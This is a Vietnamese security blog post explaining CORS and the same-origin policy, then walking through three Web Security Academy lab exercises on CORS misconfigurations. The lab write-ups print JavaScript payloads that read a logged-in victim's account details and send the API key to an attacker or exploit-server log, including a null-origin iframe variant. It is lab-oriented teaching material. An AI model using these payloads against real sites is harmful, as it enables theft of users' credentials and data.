<!doctype html>
<html lang="en-us">
  <head>
    <title>Cross-origin resource sharing - CORS // DatNLQ</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.88.1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="DatNLQ" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Cross-origin resource sharing - CORS"/>
<meta name="twitter:description" content="Cross-origin resource sharing (CORS) lÃ  gÃ¬ ? What is CORS ? TÃªn Ä‘áº§y Ä‘á»§ lÃ  Cross-Origin Resource Sharing. Hiá»ƒu sÃ¢u hÆ¡n Ä‘Ã³ chÃ­nh lÃ  chia sáº» tÃ i nguyÃªn cÃ³ nhiá»u nguá»“n gá»‘c khÃ¡c nhau. ChÃ­nh sÃ¡ch nguá»“n gá»‘c giá»‘ng nhau cá»§a trÃ¬nh duyá»‡t lÃ  má»™t cÆ¡ cháº¿ báº£o máº­t quan trá»ng. KhÃ¡ch hÃ ng tá»« cÃ¡c nguá»“n khÃ¡c nhau khÃ´ng thá»ƒ truy cáº­p tÃ i nguyÃªn cá»§a nhau náº¿u khÃ´ng Ä‘Æ°á»£c phÃ©p. Äá»‹nh nghÄ©a cá»§a tÆ°Æ¡ng Ä‘á»“ng lÃ  protocol,domain vÃ  port cá»§a liÃªn káº¿t truy cáº­p lÃ  giá»‘ng nhau."/>

    <meta property="og:title" content="Cross-origin resource sharing - CORS" />
<meta property="og:description" content="Cross-origin resource sharing (CORS) lÃ  gÃ¬ ? What is CORS ? TÃªn Ä‘áº§y Ä‘á»§ lÃ  Cross-Origin Resource Sharing. Hiá»ƒu sÃ¢u hÆ¡n Ä‘Ã³ chÃ­nh lÃ  chia sáº» tÃ i nguyÃªn cÃ³ nhiá»u nguá»“n gá»‘c khÃ¡c nhau. ChÃ­nh sÃ¡ch nguá»“n gá»‘c giá»‘ng nhau cá»§a trÃ¬nh duyá»‡t lÃ  má»™t cÆ¡ cháº¿ báº£o máº­t quan trá»ng. KhÃ¡ch hÃ ng tá»« cÃ¡c nguá»“n khÃ¡c nhau khÃ´ng thá»ƒ truy cáº­p tÃ i nguyÃªn cá»§a nhau náº¿u khÃ´ng Ä‘Æ°á»£c phÃ©p. Äá»‹nh nghÄ©a cá»§a tÆ°Æ¡ng Ä‘á»“ng lÃ  protocol,domain vÃ  port cá»§a liÃªn káº¿t truy cáº­p lÃ  giá»‘ng nhau." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://datnlq.github.io/posts/cors/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-09-28T23:34:34+07:00" />
<meta property="article:modified_time" content="2021-09-28T23:34:34+07:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
      <h1>DatNLQ</h1>
      <p>DatNLQ&#39;s personal website</p>
      <div class="app-header-social">
        
          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Cross-origin resource sharing - CORS</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Sep 28, 2021
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          12 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="cross-origin-resource-sharing-cors-lÃ -gÃ¬-">Cross-origin resource sharing (CORS) lÃ  gÃ¬ ?</h1>
<h2 id="what-is-cors-">What is CORS ?</h2>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_lythuyet.png?raw=true" alt="image"></p>
<p>TÃªn Ä‘áº§y Ä‘á»§ lÃ  Cross-Origin Resource Sharing. Hiá»ƒu sÃ¢u hÆ¡n Ä‘Ã³ chÃ­nh lÃ  chia sáº» tÃ i nguyÃªn cÃ³ nhiá»u nguá»“n gá»‘c khÃ¡c nhau. ChÃ­nh sÃ¡ch nguá»“n
gá»‘c giá»‘ng nhau cá»§a trÃ¬nh duyá»‡t lÃ  má»™t cÆ¡ cháº¿ báº£o máº­t quan trá»ng. KhÃ¡ch hÃ ng tá»« cÃ¡c nguá»“n khÃ¡c nhau khÃ´ng thá»ƒ truy cáº­p tÃ i nguyÃªn cá»§a nhau
náº¿u khÃ´ng Ä‘Æ°á»£c phÃ©p. Äá»‹nh nghÄ©a cá»§a tÆ°Æ¡ng Ä‘á»“ng lÃ  protocol,domain vÃ  port cá»§a liÃªn káº¿t truy cáº­p lÃ  giá»‘ng nhau. Trong cÃ¡c á»©ng dá»¥ng thá»±c táº¿,
cÃ¡c yÃªu cáº§u há»£p lÃ½ giá»¯a nhiá»u miá»n cÅ©ng ráº¥t quan trá»ng Ä‘á»‘i vá»›i má»™t sá»‘ á»©ng dá»¥ng.</p>
<h2 id="same-origin-policy-cÃ¹ng-nguá»“n-gá»‘c">Same-Origin Policy (CÃ¹ng nguá»“n gá»‘c)</h2>
<p>Same-origin policy lÃ  khi má»™t website thá»±c thi má»™t cÃ¡i gÃ¬ Ä‘Ã³. NghÄ©a lÃ , theo máº·c Ä‘á»‹nh, á»©ng dá»¥ng web sá»­ dá»¥ng API chá»‰ cÃ³ thá»ƒ yÃªu cáº§u tÃ i nguyÃªn
HTTP tá»« cÃ¹ng má»™t nguá»“n gá»‘c. VÃ­ dá»¥, ![image](<a href="https://www.mywebsite.com">https://www.mywebsite.com</a> yÃªu cáº§u ![image](<a href="https://www.mywebsite.com/page">https://www.mywebsite.com/page</a> khÃ´ng cÃ³ váº¥n Ä‘á» gÃ¬. NhÆ°ng khi tÃ i nguyÃªn
Ä‘Æ°á»£c Ä‘áº·t trÃªn cÃ¡c trang web cÃ³ protocol , domain phá»¥ hoáº·c port khÃ¡c nhau , thÃ¬ Ä‘Ã³ lÃ  má»™t yÃªu cáº§u khÃ´ng cÃ¹ng nguá»“n gá»‘c mÃ  hay
thÆ°á»ng gá»i lÃ  tÃªn miá»n chÃ©o.</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/Same-origin%20policy.png?raw=true" alt="image"></p>
<p>Váº­y, táº¡i sao láº¡i cÃ³ same-origin policy tá»“n táº¡i? Giáº£ sá»­ ráº±ng chÃ­nh sÃ¡ch cÃ¹ng nguá»“n gá»‘c khÃ´ng tá»“n táº¡i vÃ  báº¡n Ä‘Ã£ vÃ´ tÃ¬nh nháº¥p vÃ o má»™t trong nhiá»u liÃªn
káº¿t cÃ³ virutss mÃ  báº¡n cá»§a báº¡n gá»­i cho báº¡n trÃªn Facebook. LiÃªn káº¿t nÃ y chuyá»ƒn hÆ°á»›ng báº¡n Ä‘áº¿n má»™t &ldquo;trang web xáº¥u&rdquo; cÃ³ nhÃºng iframe táº£i trang web cá»§a ngÃ¢n
hÃ ng cá»§a báº¡n vÃ  Ä‘Äƒng nháº­p thÃ nh cÃ´ng cho báº¡n báº±ng má»™t sá»‘ cookie Ä‘Ã£ Ä‘áº·t! ğŸ˜¬ Sau khi Ä‘Äƒng nháº­p thÃ nh cÃ´ng, trang web lá»«a Ä‘áº£o nÃ y cÃ²n cÃ³ thá»ƒ kiá»ƒm soÃ¡t DOM
cá»§a iframe vÃ  chuyá»ƒn tiá»n trong tháº» cá»§a báº¡n thÃ´ng qua má»™t loáº¡t thao tÃ¡c tháº§n sáº§u mÃ  báº¡n khÃ´ng há» biáº¿t Ä‘Æ°á»£c.</p>
<h2 id="cors-http-headers">CORS HTTP headers</h2>
<ul>
<li>
<p>CORS lÃ  má»™t cÆ¡ cháº¿ xÃ¡c nháº­n thÃ´ng qua Header cá»§a request. Cá»¥ thá»ƒ lÃ  trÃªn Server sáº½ nÃ³i vá»›i browser vá» quy Ä‘á»‹nh cháº¥p nháº­n nhá»¯ng request tá»« domain nÃ o vÃ  phÆ°Æ¡ng
thá»©c ra sao (GET, POST, PUT, v.v..)</p>
<ul>
<li>
<p>Access-Control-Allow-Origin: Nhá»¯ng origin mÃ  server cho phÃ©p. (vÃ­ dá»¥ server loda.his chá»‰ cháº¥p nháº­n loda.me request lÃªn)</p>
</li>
<li>
<p>Access-Control-Allow-Headers: Nhá»¯ng Header Ä‘Æ°á»£c server cho phÃ©p. (vÃ­ dá»¥ x-authorize, origin, cÃ¡i nÃ y do server báº¡n quy Ä‘á»‹nh)</p>
</li>
<li>
<p>Access-Control-Allow-Methods: Nhá»¯ng Method Ä‘Æ°á»£c serváº» cho phÃ©p (POST, GET, v.v..)</p>
</li>
</ul>
</li>
<li>
<p>Preflight request:</p>
</li>
</ul>
<p>Má»™t cÃ¡i preflight request lÃ  má»™t request Ä‘Æ°á»£c gá»­i tá»« phÃ­a trÃ¬nh duyá»‡t Ä‘á»ƒ thÄƒm dÃ² xem server cÃ³ hiá»ƒu/ há»— trá»£ giao thá»©c CORS hay khÃ´ng. NÃ³ Ä‘Æ°á»£c tá»± Ä‘á»™ng gá»Ÿi bá»Ÿi
trÃ¬nh duyá»‡t. Viá»‡c cá»§a phÃ­a server lÃ  tráº£ vá» nhá»¯ng headers cáº§n thiáº¿t cho phÃ­a client.</p>
<ul>
<li>
<p>Origin: domain hiá»‡n táº¡i</p>
</li>
<li>
<p>Access-Control-Request-Method: Gá»­i lÃªn cÃ¡c method Ä‘á»ƒ kiá»ƒm tra xem server cÃ³ accept khÃ´ng. (GET, POST, v.v..)</p>
</li>
<li>
<p>Access-Control-Request-Headers: thÄƒm dÃ² xem má»™t header nÃ o Ä‘Ã³ cÃ³ Ä‘Æ°á»£c cháº¥p nháº­n khÃ´ng.</p>
</li>
</ul>
<h2 id="cÆ¡-cháº¿-hoáº¡t-Ä‘á»™ng-cá»§a-cors-nhÆ°-tháº¿-nÃ o">CÆ¡ cháº¿ hoáº¡t Ä‘á»™ng cá»§a CORS nhÆ° tháº¿ nÃ o?</h2>
<ul>
<li>
<p>TrÆ°á»ng há»£p Ä‘Æ¡n giáº£n nháº¥t, client (web app cháº¡y á»Ÿ browser) sáº½ táº¡o request GET, POST, PUT, HEAD, etc Ä‘á»ƒ yÃªu cáº§u server lÃ m má»™t viá»‡c gÃ¬ Ä‘Ã³. Nhá»¯ng request nÃ y sáº½ Ä‘Æ°á»£c Ä‘Ã­nh
kÃ¨m má»™t header tÃªn lÃ  Origin Ä‘á»ƒ chá»‰ Ä‘á»‹nh origin cá»§a client code (giÃ¡ trá»‹ cá»§a header nÃ y chÃ­nh lÃ  domain cá»§a trang web).</p>
</li>
<li>
<p>Server sáº½ xem xÃ©t Origin Ä‘á»ƒ biáº¿t Ä‘Æ°á»£c nguá»“n nÃ y cÃ³ pháº£i lÃ  nguá»“n há»£p lá»‡ hay khÃ´ng. Náº¿u há»£p lá»‡, server sáº½ tráº£ vá» response kÃ¨m vá»›i header Access-Control-Allow-Origin.
Header nÃ y sáº½ cho biáº¿t xem client cÃ³ pháº£i lÃ  nguá»“n há»£p lá»‡ Ä‘á»ƒ browser tiáº¿p tá»¥c thá»±c hiá»‡n quÃ¡ trÃ¬nh request.</p>
</li>
<li>
<p>Trong trÆ°á»ng há»£p thÃ´ng thÆ°á»ng, Access-Control-Allow-Origin sáº½ cÃ³ giÃ¡ trá»‹ giá»‘ng nhÆ° Origin, má»™t sá»‘ trÆ°á»ng há»£p giÃ¡ trá»‹ cá»§a Access-Control-Allow-Origin sáº½ nhÃ¬n giá»‘ng giá»‘ng
nhÆ° Regex hay chá»‰ Ä‘Æ¡n giáº£n lÃ  *, tuy nhiÃªn thÃ¬ cÃ¡ch dÃ¹ng * thÆ°á»ng Ä‘Æ°á»£c coi lÃ  khÃ´ng an toÃ n, ngoáº¡i trá»« trÆ°á»ng há»£p API cá»§a báº¡n Ä‘Æ°á»£c public hoÃ n toÃ n vÃ  ai cÅ©ng cÃ³ thá»ƒ truy
cáº­p Ä‘Æ°á»£c.</p>
</li>
</ul>
<p>==&gt; VÃ  nhÆ° tháº¿, náº¿u khÃ´ng cÃ³ header Access-Control-Allow-Origin hoáº·c giÃ¡ trá»‹ cá»§a nÃ³ khÃ´ng há»£p lá»‡ thÃ¬ browser sáº½ khÃ´ng cho phÃ©p</p>
<h3 id="vÃ­-dá»¥-">VÃ­ dá»¥ :</h3>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/example1.gif?raw=true" alt="gif">
<img src="https://github.com/datnlq/Source/blob/main/CORS/image/example2.gif?raw=true" alt="gif"></p>
<h2 id="ngÄƒn-cháº·n-cÃ¡c-cuá»™c-táº¥n-cÃ´ng-cors">NgÄƒn cháº·n cÃ¡c cuá»™c táº¥n cÃ´ng CORS</h2>
<p>CÃ¡c lá»— há»•ng CORS chá»§ yáº¿u phÃ¡t sinh do cÃ¡ch thiáº¿p láº­p khÃ´ng Ä‘Ãºng cÃ¡ch hoáº·c cÃ³ sai sÃ³t.</p>
<ul>
<li>
<p>Proper configuration of cross-domain requests(Cáº¥u hÃ¬nh thÃ­ch há»£p cá»§a cÃ¡c yÃªu cáº§u tÃªn miá»n chÃ©o) : Náº¿u tÃ i nguyÃªn web chá»©a thÃ´ng tin &ldquo;nháº¡y cáº£m&rdquo;, nguá»“n gá»‘c web pháº£i Ä‘Æ°á»£c
chá»‰ Ä‘á»‹nh chÃ­nh xÃ¡c trong tiÃªu Ä‘á» Access-Control-Allow-Origin.</p>
</li>
<li>
<p>Only allow trusted sites(Chá»‰ cho phÃ©p nhá»¯ng trang web tin cáº­y): CÃ¡c nguá»“n gá»‘c Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh trong tiÃªu Ä‘á» Access-Control-Allow-Origin chá»‰ nÃªn lÃ  cÃ¡c trang web Ä‘Ã¡ng tin cáº­y.
Äáº·c biá»‡t, nguá»“n gá»‘c pháº£n Ã¡nh Ä‘á»™ng tá»« cÃ¡c yÃªu cáº§u tÃªn miá»n chÃ©o mÃ  khÃ´ng cáº§n xÃ¡c thá»±c cÃ³ thá»ƒ dá»… dÃ ng khai thÃ¡c vÃ  nÃªn trÃ¡nh.</p>
</li>
<li>
<p>Avoid whitelisting null(TrÃ¡nh sá»­ dá»¥ng liá»‡t kÃª null): TrÃ¡nh sá»­ dá»¥ng tiÃªu Ä‘á» Access-Control-Allow-Origin: null</p>
</li>
<li>
<p>Avoid wildcards in internal networks(TrÃ¡nh cÃ¡c kÃ½ tá»± Ä‘áº¡i diá»‡n trong máº¡ng ná»™i bá»™): Chá»‰ tin cáº­y cáº¥u hÃ¬nh máº¡ng Ä‘á»ƒ báº£o vá»‡ tÃ i nguyÃªn bÃªn trong lÃ  khÃ´ng Ä‘á»§ khi cÃ¡c trÃ¬nh duyá»‡t ná»™i
bá»™ cÃ³ thá»ƒ truy cáº­p cÃ¡c miá»n bÃªn ngoÃ i khÃ´ng Ä‘Ã¡ng tin cáº­y.</p>
</li>
</ul>
<h2 id="cors-lab">CORS Lab</h2>
<h3 id="lab-cors-vulnerability-with-basic-origin-reflection">Lab: CORS vulnerability with basic origin reflection</h3>
<p>BÃ i lab Ä‘Ã£ mÃ´ táº£ lÃ  trang web nÃ y cÃ³ cáº¥u hÃ¬nh CORS khÃ´ng an toÃ n á»Ÿ chá»— nÃ³ tin cáº­y táº¥t cáº£ cÃ¡c nguá»“n gá»‘c.</p>
<p>Äá»ƒ giáº£i quyáº¿t bÃ i lab, hÃ£y táº¡o má»™t sá»‘ JavaScript sá»­ dá»¥ng CORS Ä‘á»ƒ truy xuáº¥t khÃ³a API cá»§a quáº£n trá»‹ viÃªn vÃ  táº£i mÃ£ lÃªn mÃ¡y chá»§ khai thÃ¡c cá»§a báº¡n.
Lab Ä‘Æ°á»£c giáº£i quyáº¿t khi báº¡n gá»­i thÃ nh cÃ´ng khÃ³a API cá»§a quáº£n trá»‹ viÃªn.</p>
<p>Báº¡n cÃ³ thá»ƒ Ä‘Äƒng nháº­p vÃ o tÃ i khoáº£n cá»§a mÃ¬nh báº±ng thÃ´ng tin Ä‘Äƒng nháº­p sau: wiener: peter</p>
<p>Truy cáº­p bÃ i lab vÃ  chÃºng ta tháº¥y Ä‘Æ°á»£c 1 blog vÃ  cÃ³ pháº§n login.</p>
<p>Theo nhÆ° lab thÃ¬ chÃºng ta login vÃ o account Ä‘Æ°á»£c cáº¥p tá»« trÆ°á»›c vÃ  tháº¥y Ä‘Æ°á»£c APIKey, Ä‘Ã¢y chÃ­nh lÃ  má»¥c tiÃªu cá»§a chÃºng ta. Báº¯t láº¡i request mÃ  sáº½ pháº£n há»“i vá» APIKey.</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_refletion.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_refletion_verfi.png?raw=true" alt="image"></p>
<p>Chuyá»ƒn request sang repeater vÃ  chÃ¨n thÃªm dÃ²ng <em>Origin: ![image](<a href="https://example.com">https://example.com</a></em> vÃ o request vÃ  send thÃ¬ chÃºng ta sáº½ tháº¥y pháº£n há»“i <em>Access-Control-Allow-Origin</em> nhÆ° mÃ´ táº£ vÃ¬ trang web nÃ y tin cáº­y má»i nguá»“n gá»‘c, Ä‘iá»u Ä‘Ã³ dáº«n Ä‘áº¿n báº¥t ká»³ trang web nÃ o cÅ©ng cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c thÃ´ng tin tá»« nÃ³. Äá»ƒ láº¥y Ä‘Æ°á»£c apikey chÃºng ta cÃ³ payload theo form sau :</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var req = new XMLHttpRequest();
req.onload = reqListener;
req.open(&#39;get&#39;,&#39;![image](https://vulnerable-website.com/sensitive-victim-data&#39;,true);
req.withCredentials = true;
req.send();

function reqListener() {
location=&#39;//malicious-website.com/log?key=&#39;+this.responseText;
};
</code></pre></div><p>VÃ  tá»« Ä‘Ã³ chÃºng ta cÃ³ Ä‘Æ°á»£c payload Ä‘á»ƒ sent vÃ o exploit server nhÆ° sau :</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open(&#39;get&#39;,&#39;![image](https://ac621fa31ffe7a398004558a00e900a1.web-security-academy.net/accountDetails&#39;,true);
 req.withCredentials = true;
 req.send();

 function reqListener() {
     location=&#39;/log?key=&#39;+this.responseText;
 };
&lt;/script&gt;
</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_refletion_exploit.png?raw=true" alt="image"></p>
<p>Sau khi Store payload vÃ  Deliver to Victim thÃ¬ chÃºng ta AccessLog Ä‘á»ƒ láº¥y dá»¯ liá»‡u tá»« website chÃºng ta muá»‘n vÃ  in ra mÃ n hÃ¬nh nhÆ° sau :</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_refletion_accesslog.png?raw=true" alt="image"></p>
<p>ChÃºng ta nháº­n tháº¥y dÃ²ng log?key thÃ¬ coppy vÃ  quan pháº§n Decoder cá»§a BurpSuite Ä‘á»ƒ decode, chá»n option url vÃ  chÃºng ta láº¥y Ä‘Æ°á»£c Apikey =&gt; submit Ä‘á»ƒ solve bÃ i lab.</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_refletion_apikey.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_refletion_submitsolve.png?raw=true" alt="image"></p>
<h3 id="lab-cors-vulnerability-with-trusted-null-origin">Lab: CORS vulnerability with trusted null origin</h3>
<p>Trang web nÃ y cÃ³ cáº¥u hÃ¬nh CORS khÃ´ng an toÃ n á»Ÿ chá»— nÃ³ tin tÆ°á»Ÿng nguá»“n gá»‘c &ldquo;null&rdquo;.</p>
<p>HÃ£y táº¡o má»™t sá»‘ JavaScript sá»­ dá»¥ng CORS Ä‘á»ƒ truy xuáº¥t khÃ³a API cá»§a quáº£n trá»‹ viÃªn vÃ  táº£i mÃ£ lÃªn mÃ¡y chá»§ khai thÃ¡c cá»§a báº¡n. Lab Ä‘Æ°á»£c giáº£i quyáº¿t khi báº¡n gá»­i thÃ nh cÃ´ng khÃ³a API cá»§a quáº£n trá»‹ viÃªn.</p>
<p>Báº¡n cÃ³ thá»ƒ Ä‘Äƒng nháº­p vÃ o tÃ i khoáº£n cá»§a mÃ¬nh báº±ng thÃ´ng tin Ä‘Äƒng nháº­p sau: wiener: peter</p>
<p>TÆ°Æ¡ng tá»± nhÆ° bÃ i trÆ°á»›c chÃºng ta pháº£i leak Ä‘c APIkey cá»§a account Ä‘Æ°á»£c cáº¥p sáºµn. Tuy nhiÃªn lá»— há»“ng láº§n nÃ y lÃ  vÃ¬ CORS Origin : null chá»© khÃ´ng pháº£i lÃ  * nhÆ° láº§n trÆ°á»›c nÃªn cÃ¡ch khai thÃ¡c sáº½ khÃ¡c.</p>
<p>Truy cáº­p bÃ i lab tÆ°Æ¡ng tá»± nhÆ° bÃ i trÃªn vÃ  báº¯t láº¡i request Ä‘á»ƒ phÃ¢n tÃ­ch</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_truenull_request.png?raw=true" alt="image"></p>
<p>NhÆ° Ä‘á» bÃ i mÃ´ táº£ thÃ¬ web nÃ y láº¡i tin cáº­y lÃ  null nÃªn chÃºng ta gá»­i request kÃ¨m theo Origin : null vÃ  nháº­n Ä‘c nhÆ° sau</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_truenull_verf.png?raw=true" alt="image"></p>
<p>ChÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng nhiá»u thá»§ thuáº­t khÃ¡c nhau Ä‘á»ƒ táº¡o ra má»™t yÃªu cáº§u tÃªn miá»n chÃ©o cÃ³ chá»©a giÃ¡ trá»‹ null trong Origin Header. Äiá»u nÃ y sáº½ Ä‘Ã¡p á»©ng whitelist, dáº«n Ä‘áº¿n truy cáº­p tÃªn miá»n chÃ©o. Tá»« Ä‘Ã³ cÃ³ payload nhÆ° sau:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;iframe sandbox=&#34;allow-scripts allow-top-navigation allow-forms&#34; src=&#34;data:text/html, &lt;script&gt;
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
   req.open(&#39;get&#39;,&#39;![image](https://ac3e1f561f18f33a80d6a58f005900ee.web-security-academy.net/accountDetails&#39;,true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location=&#39;![image](https://exploit-ac971f661f59f3b48092a571018c0000.web-security-academy.net/log?key=&#39;+encodeURIComponent(this.responseText);
   };
&lt;/script&gt;&#34;&gt;&lt;/iframe&gt;
</code></pre></div><p>Truy cáº­p vÃ o exploit server vÃ  Store payload Deliver to Victim Ä‘á»ƒ sent payload Ä‘i sau Ä‘Ã³ Access log Ä‘á»ƒ in ra mÃ n hÃ¬nh data leak Ä‘Æ°á»£c nhÆ° sau:</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_truenull_accesslog.png?raw=true" alt="image"></p>
<p>ChÃºng ta nháº­n tháº¥y Ä‘Æ°á»£c request lÃ  log?key thÃ¬ cop vÃ  chuyá»ƒn sang  Decoder cá»§a Burp suite Ä‘á»ƒ decode nhÆ° sau :
<img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_truenull_decode.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_truenull_submitapikey.png?raw=true" alt="image"></p>
<h3 id="lab-cors-vulnerability-with-trusted-insecure-protocols">Lab: CORS vulnerability with trusted insecure protocols</h3>
<p>Trang web nÃ y cÃ³ cáº¥u hÃ¬nh CORS khÃ´ng an toÃ n á»Ÿ chá»— nÃ³ tin cáº­y táº¥t cáº£ cÃ¡c miá»n phá»¥ báº¥t ká»ƒ giao thá»©c.</p>
<p>HÃ£y táº¡o má»™t sá»‘ JavaScript sá»­ dá»¥ng CORS Ä‘á»ƒ truy xuáº¥t khÃ³a API cá»§a quáº£n trá»‹ viÃªn vÃ  táº£i mÃ£ lÃªn mÃ¡y chá»§ khai thÃ¡c cá»§a báº¡n. Lab Ä‘Æ°á»£c giáº£i quyáº¿t khi báº¡n gá»­i thÃ nh cÃ´ng khÃ³a API cá»§a quáº£n trá»‹ viÃªn.</p>
<p>Báº¡n cÃ³ thá»ƒ Ä‘Äƒng nháº­p vÃ o tÃ i khoáº£n cá»§a mÃ¬nh báº±ng thÃ´ng tin Ä‘Äƒng nháº­p sau: wiener: peter</p>
<p>Trong bÃ i nÃ y chÃºng ta cÃ³ 1 trang web bÃ¡n hÃ ng nhÆ° sau :</p>
<p>ÄÄƒng nháº­p vÃ  báº¯t láº¡i request cÃ³ chÆ°a APIKey. ThÃªm Origin Header báº¥t ká»³ Ä‘á»ƒ check xem cÃ³ sá»­ dá»¥ng CORS hay khÃ´ng.</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocol_checkscors.png?raw=true" alt="image"></p>
<p>NhÆ° káº¿t quáº£ tráº£ vá» ta tháº¥y <em>Access-Control-Allow-Origin</em> vÃ  <em>Access-Control-Allow-Credentials</em> Ä‘iá»u Ä‘Ã³ cho tháº¥y cÃ³ Ã¡p dá»¥ng CORS.</p>
<p>VÃ¬ bÃ i nÃ y chÃº tÃ¢m Ä‘áº¿n cÃ¡c giao thá»©c nÃªn mÃ¬nh sáº½ thá»­ nhá»¯ng chá»©c nÄƒng liÃªn quan Ä‘áº¿n API, Ä‘iá»ƒn hÃ¬nh nhÆ° trong web sáº½ cÃ³ chá»©c nÄƒng Check Stock, chÃºng ta báº¯t request cá»§a chá»©c nÄƒng nÃ y xem vÃ  phÃ¢n tÃ­ch.
<img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocol_checkstock.png?raw=true" alt="image"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocol_checkstock_request.png?raw=true" alt="image"></p>
<p>NhÆ° Ä‘Ã£ tháº¥y thÃ¬ chá»©c nÄƒng nÃ y sáº½ láº¥y data tá»« 1 tÃªn miá»n phá»¥ khÃ¡c lÃ  : <em>http://stock.![image](<a href="https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net">https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net</a></em> chÃºng ta cÃ³ thá»ƒ lá»£i dá»¥ng tÃªn miá»n nÃ y Ä‘á»ƒ leak APIKey nhÆ° nhá»¯ng bÃ i trÆ°á»›c, Ä‘á»ƒ kiá»ƒm tra giáº£ thiáº¿t thÃ¬ thá»­ thay tháº¿ Origin Header á»Ÿ pháº§n account xem cÃ³ Ä‘Æ°á»£c phÃ©p hay khÃ´ng</p>
<p><img src="https://github.com/datnlq/Source/blob/main/CORS/image/CORS_protocol_checkdomain.png?raw=true" alt="image"></p>
<p>Sau Ä‘Ã³ dá»±a theo form khai thÃ¡c dá»±a trÃªn tÃªn miá»n phá»¥ Ä‘Æ°á»£c phÃ©p truy cáº­p dá»¯ liá»‡u nhÆ° sau ;</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;
   document.location=&#34;http://stock.![image](https://acfb1faa1ec0c6ec81f22d5200ae00ad.web-security-academy.net/?productId=4
   &lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;![image](https://![image](https://acfb1faa1ec0c6ec81f22d5200ae00ad.
   web-security-academy.net/accountDetails&#39;,true); req.withCredentials = true;req.send();function reqListener() 
   {location=&#39;![image](https://exploit-ac131f241ecbc63281092d6d012d001e.web-security-academy.net/log?key=&#39;%2bthis.responseText; };%3c/script&gt;&amp;storeId=1&#34;
&lt;/script&gt;
